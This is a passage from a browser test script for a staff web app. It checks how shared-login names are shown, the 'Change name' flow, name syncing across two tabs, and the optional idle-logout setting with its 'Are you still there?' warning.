  await nameDialog(pdn).waitFor();
});
await step('shared login: the top bar cuts a long login short, never the person\'s name; on a phone "Change name" is in the drawer, out of its fixed foot', async () => {
  await nameBox(pdn).fill('Muhammad Usman Sample');
  await nameDialog(pdn).getByRole('button', { name: 'Continue' }).click();
  await nameDialog(pdn).waitFor({ state: 'detached' });
  for (const login of ['Front desk (Gulshan)', 'Front desk North Nazimabad Sample Branch']) {
    // (the longest real login name, "Front desk North Nazimabad", and more, put in the label the way the page draws it)
    await pdn.locator('.user-menu > button .desk-login').evaluate((el, text) => { el.textContent = text; }, login);
    const fit = await pdn.locator('.user-menu > button .user-name').evaluate((el) => {
      const who = el.querySelector('.desk-who');
      return { who: who.textContent, whole: who.scrollWidth <= who.clientWidth, width: el.getBoundingClientRect().width };
    });
    assert.deepEqual([fit.who, fit.whole], ['Muhammad Usman Sample', true], `${login}: the person's name is shown whole`);
    assert.ok(fit.width <= 301, `at most 300px wide (${fit.width})`);
  }
  await pdn.setViewportSize({ width: 375, height: 667 });
  await pdn.getByRole('button', { name: 'Menu', exact: true }).click();
  const drawer = pdn.locator('#staff-drawer');
  await drawer.getByRole('button', { name: 'Change name' }).waitFor();
  assert.equal(await drawer.locator('.sidebar-foot').getByRole('button', { name: 'Change name' }).count(), 0, 'not in the foot that stays on screen');
  await drawer.getByRole('button', { name: 'Change name' }).click();
  await nameDialog(pdn).waitFor();
  await nameBox(pdn).fill('Sample Hina');
  await nameDialog(pdn).getByRole('button', { name: 'Continue' }).click();
  await nameDialog(pdn).waitFor({ state: 'detached' });
  assert.equal(await drawer.locator('.sidebar-foot > div').first().evaluate((el) => el.textContent.trim()), 'Front desk (Gulshan) · Sample Hina', 'the new name in the drawer (drawn again, closed)');
  await pdn.setViewportSize({ width: 1366, height: 860 });
});
await pdn.close();

// Two tabs of one browser on the same shared login (a desk computer with the Aaj ki List and Billing open): a new name in one tab
// is taken up by the other, which asks too. (Each demo tab has its own made-up data; the browser's storage is shared.)
const twoTabs = await browser.newContext({ viewport: { width: 1366, height: 860 } });
const tabA = await newPage(undefined, {}, twoTabs);
const tabB = await newPage(undefined, {}, twoTabs);
await step('shared login in two tabs: "Change name" in one tab makes the other ask too; the same name in both changes nothing', async () => {
  for (const [tab, name] of [[tabA, 'Sample Ayesha'], [tabB, 'Sample Ayesha']]) {
    await loginAs(tab, 'Front desk Islamabad');
    await nameBox(tab).fill(name);
    await nameDialog(tab).getByRole('button', { name: 'Continue' }).click();
    await nameDialog(tab).waitFor({ state: 'detached' });
  }
  await tabA.waitForTimeout(300);
  assert.equal(await nameDialog(tabA).count(), 0, 'the same name in the second tab: the first tab is not asked again');
  await tabB.locator('.user-menu > button').click();
  await tabB.locator('#user-menu-list').getByRole('button', { name: 'Change name' }).click();
  await nameBox(tabB).fill('Sample Sadia');
  await nameDialog(tabB).getByRole('button', { name: 'Continue' }).click();
  await nameDialog(tabB).waitFor({ state: 'detached' });
  await nameDialog(tabA).waitFor(); // the other tab stops the old name and asks
  assert.equal(await accountLabel(tabA), 'Front desk Islamabad', 'the old name stopped there too');
  await nameBox(tabA).fill('Sample Sadia');
  await nameDialog(tabA).getByRole('button', { name: 'Continue' }).click();
  await nameDialog(tabA).waitFor({ state: 'detached' });
  await tabB.waitForTimeout(300);
  assert.equal(await nameDialog(tabB).count(), 0, 'no back and forth');
  assert.equal(await accountLabel(tabA), 'Front desk Islamabad · Sample Sadia');
});
await twoTabs.close();
>>>>>>> golive

// ------------------------------------------------------------- logging out after no activity
// The owner (15 Oct): "please remove force log out. the google sheet stays logged in for days and days". session_timeout_minutes 0
// (or no value) = never; 5 to 720 = after that many minutes. The demo never logs out for no activity (its login lives in the page), so
// these steps make the page act as the live site does (state.data.mode) and move the page's clock forward instead of waiting.
const liveLike = (pg, minutes) => pg.evaluate(async (m) => {
  const { state } = await import('/js/state.js');
  state.data.mode = 'idle-test';
  const settings = { ...state.ref.settings };
  if (m === null) delete settings.session_timeout_minutes; else settings.session_timeout_minutes = m;
  state.ref.settings = settings;
  document.dispatchEvent(new Event('app:activity'));
}, minutes);
const stillThere = (pg) => pg.locator('.modal', { hasText: 'Are you still there?' });
const pset = await newPage();
await step('Settings: "Log staff out after no activity" shows Never when nothing is set, saves Never as 0 and "After N minutes" as N', async () => {
  await loginAs(pset, 'Dr. Ali Rashid');
  await pset.goto(BASE + '#/staff/admin?tab=settings');
  const group = pset.getByRole('group', { name: 'Log staff out after no activity' });
  await group.waitFor();
  const never = group.getByLabel('Never (stay signed in, like the Google Sheet)');
  const after = group.getByLabel('After', { exact: true });
  const minutes = group.getByLabel('Minutes of no activity before staff are logged out');
  assert.equal(await never.isChecked(), true, 'Never is chosen when no time is set');
  assert.equal(await minutes.isDisabled(), true, 'the minutes box is for "After" only');
  assert.match(await pset.locator('#idle-logout-hint').innerText(), /staff can still press Log out in the name menu/);
  const saved = () => pset.evaluate(async () => { const { state } = await import('/js/state.js'); return (await state.data.settings()).session_timeout_minutes; });
  // Save, then wait until the (demo) database has the value: a "Settings saved." toast from the save before may still be on screen.
  const save = async (want) => {
    await pset.getByRole('button', { name: 'Save settings' }).click();
    for (let i = 0; i < 50 && (await saved()) !== want; i += 1) await pset.waitForTimeout(100);
  };
  await save(0);
  assert.equal(await saved(), 0, 'Never is saved as 0');
  await after.check();
  assert.equal(await minutes.isEnabled(), true, '"After" opens the minutes box');
  await minutes.fill('3');
  await pset.getByRole('button', { name: 'Save settings' }).click();
  await pset.locator('.field-error', { hasText: 'Enter a whole number of minutes from 5 to 720, or choose Never.' }).waitFor();
  assert.equal(await saved(), 0, 'nothing saved while the minutes are wrong');
  await minutes.fill('45');
  await save(45);
  assert.equal(await saved(), 45);
  await pset.goto(BASE + '#/staff/admin?tab=staff');
  await pset.goto(BASE + '#/staff/admin?tab=settings');
  await group.waitFor();
  assert.equal(await after.isChecked(), true, 'a saved time opens as "After"');
  assert.equal(await minutes.inputValue(), '45');
  await never.check();
  assert.equal(await minutes.isDisabled(), true);
  await save(0);
  assert.equal(await saved(), 0, 'back to Never: 0');
});
await pset.close();
const pidle = await newPage();
await pidle.clock.install();
await step('No activity with a time set (5 minutes): "Are you still there?" a minute before, then logged out, saying why', async () => {
  await loginAs(pidle, 'Front desk \\(Gulshan\\)');
  await liveLike(pidle, 5);
  await pidle.clock.fastForward(4 * 60 * 1000 + 5000);
  await stillThere(pidle).waitFor();
  await pidle.clock.fastForward(60 * 1000);
  await pidle.locator('#toasts .toast', { hasText: 'You were logged out because there was no activity for 5 minutes.' }).waitFor();
  assert.equal(await pidle.locator('.topbar').count(), 0, 'the staff screen is gone');
});
await pidle.close();
const pnever = await newPage();
await pnever.clock.install();
await step('No activity with Never (0, or no value): days later still signed in, no warning; a time set later counts from the last activity', async () => {
  await loginAs(pnever, 'Front desk \\(Gulshan\\)');
  const twoDays = 2 * 24 * 60 * 60 * 1000;
  for (const minutes of [0, null]) {
    await liveLike(pnever, minutes);
    await pnever.clock.fastForward(twoDays);
    await pnever.keyboard.press('Shift'); // activity after the long quiet spell
    await pnever.waitForTimeout(300);
    assert.equal(await stillThere(pnever).count(), 0, `${minutes ?? 'no value'}: no warning`);
    assert.equal(await pnever.locator('.topbar').count(), 1, `${minutes ?? 'no value'}: still signed in`);
    assert.equal(await pnever.locator('#toasts .toast', { hasText: 'logged out' }).count(), 0, `${minutes ?? 'no value'}: no logout notice`);
    // The activity is still shared with the other tabs, so a tab running an older copy of the website (0 read as 30 minutes) does not end the login.
    const sharedAgo = await pnever.evaluate(() => Date.now() - Number(localStorage.getItem('staff-last-active')));
    assert.ok(sharedAgo >= 0 && sharedAgo < 5000, `${minutes ?? 'no value'}: the key press is shared with other tabs (${sharedAgo} ms ago)`);
  }
  // Four days after the login, a limit set now starts from the last activity (the key press above), not from the login.
  await liveLike(pnever, 5);
  await pnever.waitForTimeout(300);
  assert.equal(await pnever.locator('.topbar').count(), 1, 'a limit set later does not log out at once');
  await pnever.clock.fastForward(4 * 60 * 1000 + 5000);
  await stillThere(pnever).waitFor();
  await stillThere(pnever).getByRole('button', { name: 'Stay signed in' }).click();
  await stillThere(pnever).waitFor({ state: 'detached' });
  assert.equal(await pnever.locator('.topbar').count(), 1, '"Stay signed in" keeps the login');
});
await pnever.close();

await browser.close();
if (errors.length) { console.log('Browser errors:\n  ' + [...new Set(errors)].join('\n  ')); process.exitCode = 1; }
console.log(`${passed} checks passed`);
